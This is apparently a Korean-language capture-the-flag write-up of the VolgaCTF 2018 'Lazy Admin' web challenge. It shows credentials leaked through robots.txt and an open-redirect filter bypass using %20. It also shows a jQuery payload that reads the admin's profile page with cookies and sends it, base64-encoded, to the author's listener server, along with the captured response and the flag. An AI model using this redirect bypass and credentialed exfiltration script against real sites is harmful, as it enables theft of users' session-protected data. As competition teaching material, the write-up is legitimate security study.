# [Web] VolaCTF - Lazy Admin

## Description

This lazy admin has not authorized my account yet! Get his email, I want to write to him.

<http://lazy-admin.quals.2018.volgactf.ru/>

##### Hints

1. I like **orange**s and what fruits do you like?



## Analysis

접속하면 로그인 페이지가 나타난다.

아이디, 패스워드는 /robots.txt에 노출된 경로에 접근하여 얻을 수 있다.

```
$ curl http://lazy-admin.quals.2018.volgactf.ru/robots.txt
Disallow: /unauthorized_users.txt

$ curl http://lazy-admin.quals.2018.volgactf.ru/unauthorized_users.txt
1. Nick:BjnjjdGonhdkG@!lf
```

Nick, BjnjjdGonhdkG@!lf로 로그인이 가능하다.

로그인 하면 verification code가 보여진다.

*[ FhgNODNBSWKV ]*

Verify 메뉴로 들어가면 verification code를 삽입하여 Submit하라고 한다.

Submit하면 'Wait a bit, the administrator will soon click on the link and authorize this account'의 문구만 나타나고 아무런 반응이 없다.

페이지를 직접 요청하니 http://lazy-admin.quals.2018.volgactf.ru/?redir=/verify.php를 통해 다시 verify.php로 돌아온다.

redir의 인자를 내 서버로 설정하니 'Redirect Error!'가 발생했다.

이는 %20을 이용하여 우회가 가능하다.

**Query :** http://lazy-admin.quals.2018.volgactf.ru/?redir=%20http://[MY SERVER]

정상적으로 페이지가 이동되는 것을 확인할 수 있다.

이제 이를 이용하여 CSRF를 해보자.

## Exploit

위의 쿼리를 Verify를 통해 Submit하면 응답이 날라온다.

**Query :** /?redir=%20http://[MY SERVER]

```
$ nc -lvp 10101
Listening on [0.0.0.0] (family 0, port 10101)
Connection from [82.202.212.170] port 10101 [tcp/*] accepted (family 2, sport 40672)
GET / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en,*
Host: [MY SERVER]
```

CSRF 공격을 위한 코드를 Jquery를 이용해 작성하였다.

```html
<script src="jquery.js"></script>
<script>
	$.ajax({
		url: "http://lazy-admin.quals.2018.volgactf.ru/profile.php",
		type: "GET",
		xhrFields: {
			withCredentials: true,
		},
		success: function(data){
			location.href="//[MY SERVER]/?"+btoa(data);
		},
	});
</script>
```

작성 된 코드를 Verify를 요청하자.

**Query :** /?redir=%20http://[MY SERVER}]

```
$ nc -lvp 10101
Listening on [0.0.0.0] (family 0, port 10101)
Connection from [82.202.212.170] port 10101 [tcp/*] accepted (family 2, sport 40691)
GET /?DQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sIGxhbmc9ImVuIj4NCiAgPGhlYWQ+DQogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPg0KICAgIDxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iSUU9ZWRnZSI+DQogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj4NCiAgICA8IS0tIFRoZSBhYm92ZSAzIG1ldGEgdGFncyAqbXVzdCogY29tZSBmaXJzdCBpbiB0aGUgaGVhZDsgYW55IG90aGVyIGhlYWQgY29udGVudCBtdXN0IGNvbWUgKmFmdGVyKiB0aGVzZSB0YWdzIC0tPg0KICAgIDxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSIiPg0KICAgIDxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iIj4NCiAgICA8bGluayByZWw9Imljb24iIGhyZWY9Ii9hc3NldHMvZmF2aWNvbi5pY28iPg0KDQogICAgPHRpdGxlPlN0cmljdCBibG9nPC90aXRsZT4NCg0KICAgIDwhLS0gQm9vdHN0cmFwIGNvcmUgQ1NTIC0tPg0KICAgIDxsaW5rIGhyZWY9Ii9hc3NldHMvY3NzL2Jvb3RzdHJhcC5taW4uY3NzIiByZWw9InN0eWxlc2hlZXQiPg0KDQogICAgPCEtLSBJRTEwIHZpZXdwb3J0IGhhY2sgZm9yIFN1cmZhY2UvZGVza3RvcCBXaW5kb3dzIDggYnVnIC0tPg0KICAgIDxsaW5rIGhyZWY9Ii9hc3NldHMvY3NzL2llMTAtdmlld3BvcnQtYnVnLXdvcmthcm91bmQuY3NzIiByZWw9InN0eWxlc2hlZXQiPg0KDQogICAgPCEtLSBDdXN0b20gc3R5bGVzIGZvciB0aGlzIHRlbXBsYXRlIC0tPg0KICAgIDxsaW5rIGhyZWY9Ii9hc3NldHMvc3RhcnRlci10ZW1wbGF0ZS5jc3MiIHJlbD0ic3R5bGVzaGVldCI+DQoNCiAgICA8IS0tIEp1c3QgZm9yIGRlYnVnZ2luZyBwdXJwb3Nlcy4gRG9uJ3QgYWN0dWFsbHkgY29weSB0aGVzZSAyIGxpbmVzISAtLT4NCiAgICA8IS0tW2lmIGx0IElFIDldPjxzY3JpcHQgc3JjPSIuLi8uLi9hc3NldHMvanMvaWU4LXJlc3BvbnNpdmUtZmlsZS13YXJuaW5nLmpzIj48L3NjcmlwdD48IVtlbmRpZl0tLT4NCiAgICA8c2NyaXB0IHNyYz0iL2Fzc2V0cy9pZS1lbXVsYXRpb24tbW9kZXMtd2FybmluZy5qcyI+PC9zY3JpcHQ+DQoNCiAgICA8IS0tIEhUTUw1IHNoaW0gYW5kIFJlc3BvbmQuanMgZm9yIElFOCBzdXBwb3J0IG9mIEhUTUw1IGVsZW1lbnRzIGFuZCBtZWRpYSBxdWVyaWVzIC0tPg0KICAgIDwhLS1baWYgbHQgSUUgOV0+DQogICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9vc3MubWF4Y2RuLmNvbS9odG1sNXNoaXYvMy43LjMvaHRtbDVzaGl2Lm1pbi5qcyI+PC9zY3JpcHQ+DQogICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9vc3MubWF4Y2RuLmNvbS9yZXNwb25kLzEuNC4yL3Jlc3BvbmQubWluLmpzIj48L3NjcmlwdD4NCiAgICA8IVtlbmRpZl0tLT4NCiAgPC9oZWFkPg0KDQogIDxib2R5Pg0KDQogICAgPG5hdiBjbGFzcz0ibmF2YmFyIG5hdmJhci1pbnZlcnNlIG5hdmJhci1maXhlZC10b3AiPg0KICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4NCiAgICAgICAgPGRpdiBjbGFzcz0ibmF2YmFyLWhlYWRlciI+DQogICAgICAgICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJuYXZiYXItdG9nZ2xlIGNvbGxhcHNlZCIgZGF0YS10b2dnbGU9ImNvbGxhcHNlIiBkYXRhLXRhcmdldD0iI25hdmJhciIgYXJpYS1leHBhbmRlZD0iZmFsc2UiIGFyaWEtY29udHJvbHM9Im5hdmJhciI+DQogICAgICAgICAgICA8c3BhbiBjbGFzcz0ic3Itb25seSI+VG9nZ2xlIG5hdmlnYXRpb248L3NwYW4+DQogICAgICAgICAgICA8c3BhbiBjbGFzcz0iaWNvbi1iYXIiPjwvc3Bhbj4NCiAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJpY29uLWJhciI+PC9zcGFuPg0KICAgICAgICAgICAgPHNwYW4gY2xhc3M9Imljb24tYmFyIj48L3NwYW4+DQogICAgICAgICAgPC9idXR0b24+DQogICAgICAgICAgPGEgY2xhc3M9Im5hdmJhci1icmFuZCIgaHJlZj0iIyI+U3RyaWN0IGJsb2c8L2E+DQogICAgICAgIDwvZGl2Pg0KICAgICAgICA8ZGl2IGlkPSJuYXZiYXIiIGNsYXNzPSJjb2xsYXBzZSBuYXZiYXItY29sbGFwc2UiPg0KICAgICAgICAgIDx1bCBjbGFzcz0ibmF2IG5hdmJhci1uYXYiPg0KICAgICAgICAgICAgPGxpPjxhIGhyZWY9Ii9wcm9maWxlLnBocCI+UHJvZmlsZTwvYT48L2xpPg0KICAgICAgICAgICAgPGxpPjxhIGhyZWY9Ii92ZXJpZnkucGhwIj5WZXJpZnk8L2E+PC9saT4NCiAgICAgICAgICAgIDxsaT48YSBocmVmPSIvbG9nb3V0LnBocCI+TG9nb3V0PC9hPjwvbGk+DQogICAgICAgICAgPC91bD4NCiAgICAgICAgPC9kaXY+PCEtLS8ubmF2LWNvbGxhcHNlIC0tPg0KICAgICAgPC9kaXY+DQogICAgPC9uYXY+DQoNCiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPg0KDQogICAgICA8ZGl2IGNsYXNzPSJzdGFydGVyLXRlbXBsYXRlIj4NCiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9mb250LWF3ZXNvbWUvNC43LjAvY3NzL2ZvbnQtYXdlc29tZS5taW4uY3NzIj4NCjxzdHlsZT4NCi5jYXJkIHsNCiAgYm94LXNoYWRvdzogMCA0cHggOHB4IDAgcmdiYSgwLCAwLCAwLCAwLjIpOw0KICBtYXgtd2lkdGg6IDMwMHB4Ow0KICBtYXJnaW46IGF1dG87DQogIHRleHQtYWxpZ246IGNlbnRlcjsNCiAgZm9udC1mYW1pbHk6IGFyaWFsOw0KfQ0KDQoudGl0bGUgew0KICBjb2xvcjogZ3JleTsNCiAgZm9udC1zaXplOiAxOHB4Ow0KfQ0KDQouY29kZSB7DQogIGJvcmRlcjogbm9uZTsNCiAgb3V0bGluZTogMDsNCiAgZGlzcGxheTogaW5saW5lLWJsb2NrOw0KICBwYWRkaW5nOiA4cHg7DQogIGNvbG9yOiB3aGl0ZTsNCiAgYmFja2dyb3VuZC1jb2xvcjogIzAwMDsNCiAgdGV4dC1hbGlnbjogY2VudGVyOw0KICBjdXJzb3I6IHBvaW50ZXI7DQogIHdpZHRoOiAxMDAlOw0KICBmb250LXNpemU6IDE4cHg7DQp9DQoNCmEuaWNvbnMgew0KICB0ZXh0LWRlY29yYXRpb246IG5vbmU7DQogIGZvbnQtc2l6ZTogMjJweDsNCiAgY29sb3I6IGJsYWNrOw0KfQ0KDQouY29kZTpob3ZlciwgYS5pY29uczpob3ZlciB7DQogIG9wYWNpdHk6IDAuNzsNCn0NCjwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCg0KPGgyIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlciI+VXNlciBQcm9maWxlIENhcmQ8L2gyPg0KDQo8ZGl2IGNsYXNzPSJjYXJkIj4NCiAgPGgxPmFkbWluPC9oMT4NCiAgPHAgY2xhc3M9InRpdGxlIj5Wb2xnYUNURntjbGllTnRfUzFEZV9pc19Bd2VzMG1FRV9XaXRoX3BAcnNlX1VybH08L3A+DQogIDxwPkxhenkgYWRtaW48L3A+DQogIDxkaXYgc3R5bGU9Im1hcmdpbjogMjRweCAwOyI+DQogICAgPGEgY2xhc3M9Imljb25zIiBocmVmPSIjIj48aSBjbGFzcz0iZmEgZmEtZHJpYmJibGUiPjwvaT48L2E+IA0KICAgIDxhIGNsYXNzPSJpY29ucyIgaHJlZj0iIyI+PGkgY2xhc3M9ImZhIGZhLXR3aXR0ZXIiPjwvaT48L2E+ICANCiAgICA8YSBjbGFzcz0iaWNvbnMiIGhyZWY9IiMiPjxpIGNsYXNzPSJmYSBmYS1saW5rZWRpbiI+PC9pPjwvYT4gIA0KICAgIDxhIGNsYXNzPSJpY29ucyIgaHJlZj0iIyI+PGkgY2xhc3M9ImZhIGZhLWZhY2Vib29rIj48L2k+PC9hPiANCiA8L2Rpdj4NCiA8cD5Zb3VyIHZlcmlmaWNhdGlvbiBjb2RlOjwvcD4NCiA8cD48ZGl2IGNsYXNzPSJjb2RlIj5GaGdOT0ROQlNXS1Y8L2Rpdj48L3A+DQo8L2Rpdj4gICAgICA8L2Rpdj4NCg0KICAgIDwvZGl2PjwhLS0gLy5jb250YWluZXIgLS0+DQoNCg0KICAgIDwhLS0gQm9vdHN0cmFwIGNvcmUgSmF2YVNjcmlwdA0KICAgID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IC0tPg0KICAgIDwhLS0gUGxhY2VkIGF0IHRoZSBlbmQgb2YgdGhlIGRvY3VtZW50IHNvIHRoZSBwYWdlcyBsb2FkIGZhc3RlciAtLT4NCiAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hamF4Lmdvb2dsZWFwaXMuY29tL2FqYXgvbGlicy9qcXVlcnkvMS4xMi40L2pxdWVyeS5taW4uanMiPjwvc2NyaXB0Pg0KICAgIDxzY3JpcHQ+d2luZG93LmpRdWVyeSB8fCBkb2N1bWVudC53cml0ZSgnPHNjcmlwdCBzcmM9Ii4uLy4uL2Fzc2V0cy9qcy92ZW5kb3IvanF1ZXJ5Lm1pbi5qcyI+PFwvc2NyaXB0PicpPC9zY3JpcHQ+DQogICAgPHNjcmlwdCBzcmM9Ii9hc3NldHMvYm9vdHN0cmFwLm1pbi5qcyI+PC9zY3JpcHQ+DQogICAgPCEtLSBJRTEwIHZpZXdwb3J0IGhhY2sgZm9yIFN1cmZhY2UvZGVza3RvcCBXaW5kb3dzIDggYnVnIC0tPg0KICAgIDxzY3JpcHQgc3JjPSIvYXNzZXRzL2llMTAtdmlld3BvcnQtYnVnLXdvcmthcm91bmQuanMiPjwvc2NyaXB0Pg0KICA8L2JvZHk+DQo8L2h0bWw+DQo= HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://g64.shpik.xyz/pp.html
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en,*
Host: g64.shpik.xyz:10101
```

위와 같은 결과 값이 응답왔으며, 이를 base64 디코드하면 다음과 같다.

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="/assets/favicon.ico">

    <title>Strict blog</title>

    <!-- Bootstrap core CSS -->
    <link href="/assets/css/bootstrap.min.css" rel="stylesheet">

    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <link href="/assets/css/ie10-viewport-bug-workaround.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="/assets/starter-template.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="/assets/ie-emulation-modes-warning.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>

  <body>

    <nav class="navbar navbar-inverse navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="#">Strict blog</a>
        </div>
        <div id="navbar" class="collapse navbar-collapse">
          <ul class="nav navbar-nav">
            <li><a href="/profile.php">Profile</a></li>
            <li><a href="/verify.php">Verify</a></li>
            <li><a href="/logout.php">Logout</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav>

    <div class="container">

      <div class="starter-template">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
.card {
  box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2);
  max-width: 300px;
  margin: auto;
  text-align: center;
  font-family: arial;
}

.title {
  color: grey;
  font-size: 18px;
}

.code {
  border: none;
  outline: 0;
  display: inline-block;
  padding: 8px;
  color: white;
  background-color: #000;
  text-align: center;
  cursor: pointer;
  width: 100%;
  font-size: 18px;
}

a.icons {
  text-decoration: none;
  font-size: 22px;
  color: black;
}

.code:hover, a.icons:hover {
  opacity: 0.7;
}
</style>
</head>
<body>

<h2 style="text-align:center">User Profile Card</h2>

<div class="card">
  <h1>admin</h1>
  <p class="title">VolgaCTF{clieNt_S1De_is_Awes0mEE_With_p@rse_Url}</p>
  <p>Lazy admin</p>
  <div style="margin: 24px 0;">
    <a class="icons" href="#"><i class="fa fa-dribbble"></i></a>
    <a class="icons" href="#"><i class="fa fa-twitter"></i></a>
    <a class="icons" href="#"><i class="fa fa-linkedin"></i></a>
    <a class="icons" href="#"><i class="fa fa-facebook"></i></a>
 </div>
 <p>Your verification code:</p>
 <p><div class="code">FhgNODNBSWKV</div></p>
</div>      </div>

    </div><!-- /.container -->


    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script>window.jQuery || document.write('<script src="../../assets/js/vendor/jquery.min.js"><\/script>')</script>
    <script src="/assets/bootstrap.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="/assets/ie10-viewport-bug-workaround.js"></script>
  </body>
</html>
```

위 소스코드중 Flag가 있는 것을 확인할 수 있다.



**VolgaCTF{clieNt_S1De_is_Awes0mEE_With_p@rse_Url}**

